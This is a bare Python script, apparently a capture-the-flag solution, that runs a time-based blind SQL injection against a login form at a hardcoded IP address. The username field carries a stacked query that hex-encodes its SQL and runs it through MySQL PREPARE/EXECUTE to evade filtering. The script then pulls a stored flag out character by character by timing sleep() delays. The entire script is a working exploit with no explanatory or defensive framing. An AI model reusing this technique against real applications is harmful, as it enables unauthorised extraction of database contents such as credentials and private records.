#! /usr/bin/python3
import requests
import json
import time

def main():
	url = '''http://182.92.220.157:11116/index.php?r=Login/Login'''
	payloads = "asd';set @a=0x{0};prepare ctftest from @a;execute ctftest-- -"
	flag = ''
	for i in range(1,30):
		payload = "select if(ascii(substr((select flag from flag),{0},1))={1},sleep(3),1)"
		for j in range(0,128):
			datas = {'username':payloads.format(str_to_hex(payload.format(i,j))),'password':'test213'}
			data = json.dumps(datas)
			times = time.time()
			res = requests.post(url = url, data = data)
			if time.time() - times >= 3:
				flag = flag + chr(j)
				print(flag)
				break

def str_to_hex(s):
    return ''.join([hex(ord(c)).replace('0x', '') for c in s])

if __name__ == '__main__':
	main()